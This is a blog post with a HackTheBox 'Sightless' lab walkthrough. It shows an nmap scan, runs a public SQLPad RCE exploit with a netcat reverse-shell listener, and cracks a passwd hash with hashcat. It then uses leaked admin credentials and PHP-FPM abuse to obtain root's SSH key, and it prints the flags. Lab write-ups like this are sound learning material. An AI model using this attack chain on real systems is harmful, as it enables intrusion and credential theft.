<!DOCTYPE html>
<html lang="en-us">
  <head>
    <title>HTB Seasonal: Sightless | v3l1d&#39;s Blog</title>

    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
<meta name="viewport" content="width=device-width,minimum-scale=1">
<meta name="description" content="Port Scanning
# Nmap 7.94SVN scan initiated Sat Oct 19 07:30:38 2024 as: nmap -sC -sV -A -T4 -o port_scan 10.10.11.32 Nmap scan report for 10.10.11.32 Host is up (0.055s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp | fingerprint-strings: | GenericLines: | 220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32] | Invalid command: try being more creative |_ Invalid command: try being more creative 22/tcp open ssh OpenSSH 8.">
<meta name="generator" content="Hugo 0.92.2" />


  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">


<link rel="stylesheet" href="/css/style.css">



<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />








  </head>

  <body>
    <nav class="navigation">
	
		<a href="/"> <span class="arrow">←</span>Home</a>
	
	<a href="/posts">Archive</a>
	<a href="/tags">Tags</a>
	<a href="/about">About</a>

	

	
</nav>


    <main class="main">
      

<section id="single">
    <h1 class="title">HTB Seasonal: Sightless</h1>

    <div class="tip">
        <time datetime="2024-10-23 00:00:00 &#43;0000 UTC">Oct 23, 2024</time>
        <span class="split">
          ·
        </span>
        <span>
          620 words
        </span>
        <span class="split">
          ·
        </span>
        <span>
          3 minute read
        </span>
    </div>

    
    


    <div class="content">
      <p><p class="markdown-image">
  <img src="attachment/3c53323d2941b4f7ea6cae026cd9a5fe.jpg" alt=""  />
</p></p>
<p><strong>Port Scanning</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Nmap 7.94SVN scan initiated Sat Oct 19 07:30:38 2024 as: nmap -sC -sV -A -T4 -o port_scan 10.10.11.32</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.32
Host is up <span style="color:#f92672">(</span>0.055s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     <span style="color:#ae81ff">220</span> ProFTPD Server <span style="color:#f92672">(</span>sightless.htb FTP Server<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>::ffff:10.10.11.32<span style="color:#f92672">]</span>
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">256</span> c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Did not follow redirect to http://sightless.htb/
|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/19%Time<span style="color:#f92672">=</span>6713986B%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>
SF:GenericLines,A0,<span style="color:#e6db74">&#34;220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2
</span><span style="color:#e6db74">SF:0Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x2
</span><span style="color:#e6db74">SF:0try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\
</span><span style="color:#e6db74">SF:x20being\x20more\x20creative\r\n&#34;</span><span style="color:#f92672">)</span>;
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Sat Oct 19 07:31:50 2024 -- 1 IP address (1 host up) scanned in 72.13 seconds</span>

</code></pre></div><p>On port 80 you can find:
<p class="markdown-image">
  <img src="attachment/8db1342a35138b47d996fa54bd247351.png" alt=""  />
</p></p>
<p>Go trough SQLPad pushing on start now and you&rsquo;ll be redirected to SQLPAD console and you can fetch SQLPad version:</p>
<p><p class="markdown-image">
  <img src="attachment/9b1808231436cb591e9d9f85527fdd63.png" alt=""  />
</p></p>
<p>**Version 6.10.0 identified, let&rsquo;s try find out something about:</p>
<p><p class="markdown-image">
  <img src="attachment/2bf35d48995bbaeef6b26b37d2d20de1.png" alt=""  />
</p></p>
<p>URL: <a href="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944/tree/main" target="_blank" rel="noopener">https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944/tree/main</a></p>
<p>Let&rsquo;s clone the repository and try to run the exploit, while listening on a wished port from another terminal:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sightless/sqlpad-rce-exploit-CVE-2022-0944<span style="color:#f92672">]</span>
└─$ python3 exploit.py http://sqlpad.sightless.htb 10.10.14.113 <span style="color:#ae81ff">9091</span>
---------------------------------------------------------------------
┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sightless<span style="color:#f92672">]</span>
└─$ nc -lnvp <span style="color:#ae81ff">9091</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9091</span> ...
</code></pre></div><p>And got the shell:</p>
<p><p class="markdown-image">
  <img src="attachment/fe342ce104a9a7cfb82690372af1f7f2.png" alt=""  />
</p></p>
<p>There&rsquo;s a file sqlpad.sqlite:
<p class="markdown-image">
  <img src="attachment/9ee6825e92c38020c4d8b7f7fbb9f070.png" alt=""  />
</p></p>
<p>In this file are present some interesting parts:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin@sightless.htbadmin$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.
����1john@sightless.htb3        admin@sightless.htb
</code></pre></div><p>Meanwhile try to run a linpeas on sqlpad machine:
<p class="markdown-image">
  <img src="attachment/cb5e7e14d62ecb6a8111c1d31d0440bd.png" alt=""  />
</p></p>
<p><p class="markdown-image">
  <img src="attachment/a0f88f95ba5694f4e5d41dc034b8ce87.png" alt=""  />
</p></p>
<p>There&rsquo;s an hash for user <strong>micheal</strong> in passwd file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7::
</code></pre></div><p>Try to crack it with hashcat:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sightless<span style="color:#f92672">]</span>
└─$ <span style="color:#75715e"># Example command for Hashcat</span>
hashcat -m <span style="color:#ae81ff">1800</span> -a <span style="color:#ae81ff">0</span> -o cracked_micheal_hash.txt micheal_user_hash /usr/share/wordlists/rockyou.txt
hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting
......
Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">0</span> MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: <span style="color:#ae81ff">14344384</span>
* Bytes.....: <span style="color:#ae81ff">139921497</span>
* Keyspace..: <span style="color:#ae81ff">14344384</span>

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length <span style="color:#f92672">(</span>usually down to 32<span style="color:#f92672">)</span>.

* Append -w <span style="color:#ae81ff">3</span> to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better <span style="color:#66d9ef">for</span> specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: <span style="color:#ae81ff">1800</span> <span style="color:#f92672">(</span>sha512crypt $6$, SHA512 <span style="color:#f92672">(</span>Unix<span style="color:#f92672">))</span>
Hash.Target......: $6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa....L2IJD/
Time.Started.....: Sat Oct <span style="color:#ae81ff">19</span> 08:58:04 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">43</span> secs<span style="color:#f92672">)</span>
Time.Estimated...: Sat Oct <span style="color:#ae81ff">19</span> 08:58:47 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
Kernel.Feature...: Pure Kernel
Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
Speed.#1.........:     <span style="color:#ae81ff">1344</span> H/s <span style="color:#f92672">(</span>8.77ms<span style="color:#f92672">)</span> @ Accel:64 Loops:1024 Thr:1 Vec:4
Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>
Progress.........: 58496/14344384 <span style="color:#f92672">(</span>0.41%<span style="color:#f92672">)</span>
Rejected.........: 0/58496 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
Restore.Point....: 58432/14344384 <span style="color:#f92672">(</span>0.41%<span style="color:#f92672">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Device Generator
Candidates.#1....: jhoselin -&gt; iloverhys
Hardware.Mon.#1..: Util: 89%

Started: Sat Oct <span style="color:#ae81ff">19</span> 08:58:02 <span style="color:#ae81ff">2024</span>
Stopped: Sat Oct <span style="color:#ae81ff">19</span> 08:58:49 <span style="color:#ae81ff">2024</span>

┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sightless<span style="color:#f92672">]</span>
└─$ cat cracked_micheal_hash.txt 
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse


</code></pre></div><p>Try ssh into <strong>michael</strong>:</p>
<p><p class="markdown-image">
  <img src="attachment/e86b9c94c5913aea4b70e9b7e3fb03cc.png" alt=""  />
</p></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">userflag:9dc449a3cd76e16166ea0ae08bd65880
</code></pre></div><p>By analyzing services running on port:</p>
<p><p class="markdown-image">
  <img src="attachment/c6a62ceea6e4a4ba4721657b76a164e5.png" alt=""  />
</p></p>
<p>During ports forwarding trough SSH i found that there&rsquo;s froxlor running on 8080, but isn&rsquo;t reachable due the missing of it&rsquo;s domain name. Inspecting other ports i found that port 40975 is the port of an available chrome debugger:</p>
<p><p class="markdown-image">
  <img src="attachment/91d6ba2807b9fbb33ce0dc23bd8ee157.png" alt=""  />
</p></p>
<p><p class="markdown-image">
  <img src="attachment/70fff9de0a46ccc3364d2458727d946c.png" alt=""  />
</p></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin:ForlorfroxAdmin
</code></pre></div><p><p class="markdown-image">
  <img src="attachment/46aef148daacdeee888551a751e330d5.png" alt=""  />
</p></p>
<p><p class="markdown-image">
  <img src="attachment/82f88746687d4741f0f013bf84f1f829.png" alt=""  />
</p></p>
<p>After saving the PHPFM configuration disable and enable this by settings panel after querying
<code>http://127.0.0.1:8080/admin_settings.php?start=phpfpm</code></p>
<p>Now redo this procedure with the chmod command on id_rsa file just copied:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">chmod 644 /tmp/id_rsa
</code></pre></div><p><p class="markdown-image">
  <img src="attachment/51da7e56b9548e78bc8115eeb77b66b8.png" alt=""  />
</p></p>
<p>After a bit the command will be executed and you will be able to use id_rsa to login into root&rsquo;s ssh:</p>
<p><p class="markdown-image">
  <img src="attachment/b21470aaf193edff2e229c3637135c2c.png" alt=""  />
</p></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">rootflag: 7a2a1b4afb44130a744827929fe643d3
</code></pre></div>
    </div>

    
    
    
  <div id="comment">
    
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "your-disqus-shortname" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
  </div>


</section>


    </main>
    
    <footer id="footer">
    
        <div id="social">


    <a class="symbol" href="https://github.com/v3l1d" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>Github</title>
    <desc>Created with Sketch.</desc>
    <defs></defs>
    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
            <g id="Github" transform="translate(264.000000, 939.000000)">
                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
            </g>
        </g>
    </g>
</svg>
    </a>


</div>

    

    <div class="copyright">
    
        ❤️ v3l1d
    
    </div>

    
      <div class="powerby">
        Powered by <a href='http://www.gohugo.io/'>Hugo</a> Theme By <a href='https://github.com/nodejh/hugo-theme-mini'>nodejh</a>
      </div>
    
</footer>



  </body>
</html>
